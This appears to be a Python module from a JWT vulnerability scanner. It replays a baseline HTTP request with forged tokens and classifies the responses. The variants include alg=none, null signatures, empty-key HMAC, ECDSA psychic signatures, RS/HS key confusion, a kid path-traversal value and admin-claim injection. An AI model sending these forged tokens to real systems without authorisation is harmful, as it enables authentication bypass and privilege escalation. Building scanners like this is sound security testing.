from __future__ import annotations

import base64
import hashlib
import hmac
import http.client
import ssl
import time
from typing import Any, Callable

from . import jwt
from .http_request import RawHttp, RequestLimiter
from .jwt_tool_adapter import common_claims, safe_exploits
from .results import UPSTREAM_VERSION, nday_catalog, result
from .store import Store


def run_active(job_id: str, item: dict[str, Any], parsed: dict[str, Any], secret: bytes | None,
               settings: dict[str, Any], source: dict[str, Any], store: Store,
               cancelled: Callable[[], bool]) -> None:
    raw = item.get("request") or source.get("request")
    if not raw:
        _add_not_run(job_id, parsed, store, "no explicit HTTP baseline request was supplied")
        return
    scheme = item.get("scheme") or source.get("scheme")
    request = jwt.replace_token(raw, item["token"], item["token"])
    runner = RawHttp(settings, RequestLimiter(settings, cancelled))
    store.event(job_id, "baseline", "running", "Sending the supplied baseline request")
    try:
        baseline = runner.send(request, scheme)
    except InterruptedError:
        return
    except (OSError, ValueError, ssl.SSLError, http.client.HTTPException) as error:
        evidence_id = store.evidence(job_id, "baseline", {"request": request, "error_type": type(error).__name__})
        result(store, job_id, parsed, "baseline", "active", None, "error",
               {"reason": type(error).__name__}, evidence_id)
        _add_blocked(job_id, parsed, store, type(error).__name__)
        return
    base_evidence = _save_evidence(job_id, "baseline", item["token"], request, baseline, store)
    if baseline["status"] >= 400:
        result(store, job_id, parsed, "baseline", "active", None, "error",
               {"status": baseline["status"], "body_sha256": baseline["body_sha256"]}, base_evidence)
        _add_blocked(job_id, parsed, store, "baseline returned an error status")
        return
    result(store, job_id, parsed, "baseline", "active", None, "not_vulnerable",
           {"status": baseline["status"], "body_sha256": baseline["body_sha256"]}, base_evidence)
    canary = source.get("canary") or ""
    for test_id, cve, token, reason in _variants(parsed, secret, settings):
        if cancelled():
            return
        if runner.limiter.exhausted:
            result(store, job_id, parsed, test_id, "active", cve, "not_run",
                   {"reason": "per-job active request limit reached"})
            continue
        _test_variant(job_id, item, parsed, request, scheme, token, test_id, cve, reason,
                      baseline, canary, runner, store)


def _test_variant(job_id: str, item: dict[str, Any], parsed: dict[str, Any], raw: str,
                  scheme: str | None, token: str, test_id: str, cve: str | None, reason: str,
                  baseline: dict[str, Any], canary: str, runner: RawHttp, store: Store) -> None:
    request = jwt.replace_token(raw, item["token"], token)
    try:
        response = runner.send(request, scheme)
        status = _classify_response(baseline, response, canary)
        evidence_id = _save_evidence(job_id, test_id, token, request, response, store, baseline)
        details = {"reason": reason, "baseline_status": baseline["status"],
                   "variant_status": response["status"]}
        result(store, job_id, parsed, test_id, "active", cve, status, details, evidence_id)
    except InterruptedError:
        return
    except (OSError, ValueError, ssl.SSLError, http.client.HTTPException) as error:
        evidence_id = store.evidence(job_id, test_id, {"request": request, "variant_token": token,
                                  "error_type": type(error).__name__, "tool_version": UPSTREAM_VERSION})
        result(store, job_id, parsed, test_id, "active", cve, "error",
               {"reason": type(error).__name__}, evidence_id)


def _variants(parsed: dict[str, Any], secret: bytes | None,
              settings: dict[str, Any]) -> list[tuple[str, str | None, str, str]]:
    header, payload = parsed["header"], parsed["payload"]
    upstream = safe_exploits(parsed)
    none_names = ("alg-none", "alg-none-titlecase", "alg-none-uppercase", "alg-none-mixedcase")
    variants = [(name, "CVE-2015-2951", token, "jwt_tool alg=none variant")
                for name, token in zip(none_names, upstream["alg_none"])]
    variants.append(("null-signature", "CVE-2020-28042", upstream["null_signature"],
                     "jwt_tool null-signature variant"))
    if header.get("alg") in ("HS256", "HS384", "HS512"):
        blank = upstream.get("blank_password", _sign_hmac(header, payload, b""))
        variants.extend((("blank-password", "CVE-2019-20933", blank, "HMAC token signed with an empty key"),
                         ("blank-password-2", "CVE-2020-28637", blank, "HMAC token signed with an empty key")))
    if secret is not None and header.get("alg") in ("HS256", "HS384", "HS512"):
        variants.extend(_signed_claim_variants(header, payload, secret))
    if str(header.get("alg", "")).startswith("ES"):
        variants.append(("ecdsa-psychic-signature", "CVE-2022-21449",
                         upstream["psychic_signature"], "jwt_tool ECDSA Psychic Signature variant"))
    variants.extend(_header_variants(parsed))
    _maybe_add_confusion(variants, header, payload, settings)
    return variants


def _signed_claim_variants(header: dict[str, Any], payload: dict[str, Any], secret: bytes) -> list[tuple[str, str | None, str, str]]:
    tests = [("claim-fuzz", {**payload, "role": "admin", "xsec_canary": "jwt-analysis"}, "role and test canary"),
             ("claim-error", {**payload, "sub": {"xsec": True}, "exp": "invalid"}, "claim type mutations"),
             ("common-claims", {**payload, "admin": True, "isAdmin": True,
                                 "role": "admin", "scope": "admin"}, "common authorization claims"),
             ("time-expired", {**payload, "exp": 1}, "expired exp claim"),
             ("time-future-nbf", {**payload, "nbf": int(time.time()) + 86400}, "future nbf claim")]
    variants = [(name, None, _sign_hmac(header, claims, secret), reason) for name, claims, reason in tests]
    variants.extend(("common-claim:" + name, None,
                     _sign_hmac(header, {**payload, name: "jwt-analysis"}, secret),
                     "jwt_tool common payload claim " + name) for name in common_claims())
    return variants


def _header_variants(parsed: dict[str, Any]) -> list[tuple[str, str | None, str, str]]:
    variants = []
    for name, value in (("kid", "../../dev/null"), ("jwk", {"kty": "oct", "k": "AA"})):
        header = jwt.encode_json({**parsed["header"], name: value})
        token = header + "." + jwt.encode_json(parsed["payload"]) + "." + parsed["signature"]
        test_id = "header-kid" if name == "kid" else "header-jwk"
        cve = "CVE-2018-0114" if name == "jwk" else None
        variants.append((test_id, cve, token, f"header {name} mutation; signature unchanged"))
    return variants


def _maybe_add_confusion(out: list[tuple[str, str | None, str, str]], header: dict[str, Any],
                         payload: dict[str, Any], settings: dict[str, Any]) -> None:
    if header.get("alg", "").startswith(("RS", "PS")) and settings.get("public_key"):
        token = _sign_hmac({**header, "alg": "HS256"}, payload, settings["public_key"].encode())
        out.append(("rs-hs-confusion", "CVE-2016-10555", token,
                    "RS/HS confusion signed with the configured public key"))


def _sign_hmac(header: dict[str, Any], payload: dict[str, Any], secret: bytes) -> str:
    algorithms = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    algorithm = algorithms.get(str(header.get("alg")))
    signing = jwt.encode_json(header) + "." + jwt.encode_json(payload)
    signature = hmac.new(secret, signing.encode("ascii"), algorithm).digest() if algorithm else b""
    return signing + "." + _b64(signature)


def _b64(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def _classify_response(baseline: dict[str, Any], response: dict[str, Any], canary: str) -> str:
    if response["status"] in (401, 403):
        return "not_vulnerable"
    accepted_canary = canary and canary in baseline["body"] and canary in response["body"]
    if accepted_canary and response["status"] < 400:
        return "vulnerable"
    changed = response["status"] != baseline["status"] or response["body_sha256"] != baseline["body_sha256"]
    return "candidate" if response["status"] < 400 and changed else "not_vulnerable"


def _add_not_run(job_id: str, parsed: dict[str, Any], store: Store, reason: str) -> None:
    result(store, job_id, parsed, "baseline", "active", None, "not_run", {"reason": reason})
    for test_id, cve, applicable, _ in nday_catalog(parsed["header"]):
        result(store, job_id, parsed, test_id, "active", cve,
               "not_run" if applicable else "not_applicable", {"reason": reason})


def _add_blocked(job_id: str, parsed: dict[str, Any], store: Store, reason: str) -> None:
    for test_id, cve, applicable, _ in nday_catalog(parsed["header"]):
        result(store, job_id, parsed, test_id, "active", cve,
               "blocked" if applicable else "not_applicable", {"reason": reason})


def _save_evidence(job_id: str, test_id: str, token: str, request: str,
                   response: dict[str, Any], store: Store,
                   baseline: dict[str, Any] | None = None) -> str:
    return store.evidence(job_id, test_id, {"request": request, "variant_token": token,
                         "response": response, "baseline": baseline, "tool_version": UPSTREAM_VERSION})
